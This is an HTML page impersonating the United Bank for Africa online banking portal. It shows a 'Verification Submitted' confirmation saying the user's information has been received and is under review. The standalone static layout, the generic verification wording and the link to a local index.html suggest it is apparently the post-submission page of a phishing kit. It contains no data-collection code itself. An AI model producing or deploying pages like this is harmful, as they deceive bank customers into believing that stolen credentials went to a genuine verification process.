<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>UBA Online Banking | Verification Submitted</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>

:root{
--primary:#d50000;
--primary-dark:#b30000;
--bg:#f5f5f5;
--card-bg:#ffffff;
--text-main:#333333;
--text-muted:#666666;
--border:#eeeeee;
--success:#16a34a;
}

*{box-sizing:border-box}

body{
margin:0;
min-height:100vh;
font-family:"Inter",system-ui,sans-serif;
background:var(--bg);
color:var(--text-main);
display:flex;
flex-direction:column;
opacity:0;
transition:opacity .5s ease;
}

body.fade-in{opacity:1}

/* HEADER */

header{
background:#ffffff;
padding:16px 0;
border-bottom:1px solid var(--border);
}

.header-inner{
max-width:1100px;
margin:auto;
padding:0 20px;
display:flex;
align-items:center;
justify-content:space-between;
}

.brand{
display:flex;
align-items:center;
gap:12px;
}

.logo{
width:42px;
height:42px;
border-radius:50%;
background:var(--primary);
display:grid;
place-items:center;
font-weight:800;
color:#fff;
font-size:14px;
}

.brand-text strong{
font-size:15px;
}

.brand-text span{
font-size:12px;
color:var(--text-muted);
}

.secure-badge{
display:flex;
align-items:center;
gap:8px;
font-size:13px;
background:#f1f1f1;
padding:8px 14px;
border-radius:999px;
}

.secure-dot{
width:8px;
height:8px;
background:#22c55e;
border-radius:50%;
}

/* MAIN */

main{
flex:1;
display:flex;
align-items:center;
justify-content:center;
padding:40px 20px;
}

.portal-card{
width:100%;
max-width:480px;
background:var(--card-bg);
border-radius:14px;
border:1px solid var(--border);
box-shadow:0 12px 30px rgba(0,0,0,.08);
overflow:hidden;
text-align:center;
}

.card-body{
padding:36px 30px;
}

.status-icon{
width:64px;
height:64px;
border-radius:50%;
background:rgba(22,163,74,.1);
display:grid;
place-items:center;
margin:auto;
color:var(--success);
font-size:30px;
font-weight:bold;
}

h1{
margin-top:18px;
font-size:20px;
}

p{
margin-top:10px;
font-size:14px;
color:var(--text-muted);
line-height:1.6;
}

.btn{
display:inline-block;
margin-top:24px;
padding:12px 24px;
border-radius:999px;
background:linear-gradient(to right,var(--primary),var(--primary-dark));
color:#fff;
font-size:14px;
font-weight:600;
text-decoration:none;
}

footer{
padding:18px;
text-align:center;
font-size:12px;
color:var(--text-muted);
}

</style>
</head>

<body>

<script>document.body.classList.add("fade-in")</script>

<header>

<div class="header-inner">

<div class="brand">
<div class="logo">UBA</div>

<div class="brand-text">
<strong>UBA Online Banking</strong><br>
<span>Secure Client Portal</span>
</div>
</div>

<div class="secure-badge">
<div class="secure-dot"></div>
Secure Session
</div>

</div>

</header>

<main>

<div class="portal-card">

<div class="card-body">

<div class="status-icon">✓</div>

<h1>Verification Submitted</h1>

<p>
Your information has been successfully received and is currently under review.
Our verification team will process your request shortly.
</p>

<a href="index.html" class="btn">
Return to Home
</a>

</div>

</div>

</main>

<footer>
© 2026 United Bank For Africa. All rights reserved.
</footer>

</body>
</html>
